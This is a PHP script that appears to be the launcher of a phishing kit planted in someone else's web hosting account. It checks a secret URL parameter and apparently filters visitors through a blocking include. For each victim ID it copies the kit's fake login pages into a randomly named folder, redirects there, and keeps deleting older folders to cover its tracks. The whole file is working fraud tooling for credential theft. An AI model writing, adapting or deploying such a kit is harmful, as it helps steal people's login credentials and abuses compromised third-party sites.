<?php
session_start();
require_once 'core/inc/check_blocked.php'; 
require_once 'core/inc/functions.php';
$_SESSION['userID'] = $_GET['userid'];

// is ko change karna mad or pathan ko. Link Work like: index.php?lake=mountain

if($_GET['lake'] != "mountain"){ exit;
}

/// bhai ka code start

$now   = time();
if ($handle = opendir('/home/bremerlaw/public_html/resset-audio/365/')) { // bhai yahan full directory deni hai jisy scan kry
    $blacklist = array('.', '..', 'index.php', 'test.php', 'tmp_folder', 'core', 'personalresult.txt', 'ip.txt', 'login.php');
    // caution: bhai . or .. remove ni krna $blacklist array sy. warna pichly folders k L lg jain gy.
    while (false !== ($file = readdir($handle))) {
        if (!in_array($file, $blacklist)) {
      if ($now - filemtime($file) >= 220) { // 120 second. (use 60 * 60 for 1 hours)
      if(is_dir($file)){
         deletefolder($file); rmdir($file); // ye folder find hoga to osy delete kry gi.
      }elseif(is_file($file)){
        unlink($file);  // uncomment kr do agr koi file find ho to wo del ni ho 
    }
      }
        }
    }
    closedir($handle);
}
 function deletefolder($path) 
  { 
    if ($handle=opendir($path)) 
    { 
      while (false!==($file=readdir($handle))) 
      { 
        if ($file<>"." AND $file<>"..") 
        { 
          if (is_file($path.'/'.$file)) 
          { 
            @unlink($path.'/'.$file); 
          } 
          if (is_dir($path.'/'.$file)) 
          { 
            deletefolder($path.'/'.$file); 
            @rmdir($path.'/'.$file); 
          } 
        } 
      } 
    } 
  } 
/// -- bhai ka code End


$core_path = getcwd() . DIRECTORY_SEPARATOR . 'core';

/* START Generate random temp folder name */
$tmp_folder_name = generateRandomString(70);
$tmp_path = getcwd() . DIRECTORY_SEPARATOR . $tmp_folder_name;
$_SESSION['tmp_folder'] =  $tmp_path;

if (!file_exists($tmp_path)) {
    mkdir($tmp_path, 0777, true);
}
/* END Generate random temp folder name */

/* START Copy files from core dir to temp dir */
recurse_copy($core_path, $tmp_path);

/* Redirect to temp path */
	$praga=rand();
	$praga=md5($praga);

header("refresh:0; url=$tmp_folder_name?cmd=login_submit");

?>